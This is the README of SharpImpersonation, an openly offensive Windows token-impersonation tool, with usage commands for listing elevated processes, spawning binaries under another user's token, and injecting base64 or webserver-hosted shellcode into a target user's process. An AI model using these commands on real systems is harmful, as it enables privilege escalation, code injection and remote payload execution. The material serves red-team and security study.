# SharpImpersonation

This was a learning by doing project from my side. Well known techniques are used to built *just* another impersonation tool with some improvements in comparison to other public tools. The code base was taken from:

* [https://github.com/0xbadjuju/Tokenvator](https://github.com/0xbadjuju/Tokenvator)

A blog post for the intruduction can be found here:

* [https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/](https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/)

List user processes
--------
```
PS > PS C:\temp> SharpImpersonation.exe list
```

![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/List.PNG?raw=true)

List only elevated processes
--------
```
PS > PS C:\temp> SharpImpersonation.exe list elevated
```

Impersonate the first process of the target user to start a new binary
--------
```
PS > PS C:\temp> SharpImpersonation.exe user:<user> binary:<binary-Path>
```

![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/CreateProcessWithTokenW.PNG?raw=true)

Inject base64 encoded shellcode into the first process of the target user
--------

```
PS > PS C:\temp> SharpImpersonation.exe user:<user> shellcode:<base64shellcode>
```

![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ShellcodeBase64.PNG?raw=true)

Inject shellcode loaded from a webserver into the first process of the target user
--------

```
PS > PS C:\temp> SharpImpersonation.exe user:<user> shellcode:<URL>
```

![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ShellcodeWebDownload.PNG?raw=true)

Impersonate the target user via ImpersonateLoggedOnuser for the current session
--------

```
PS > PS C:\temp> SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ImpersonateLoggedOnUser.png?raw=true)
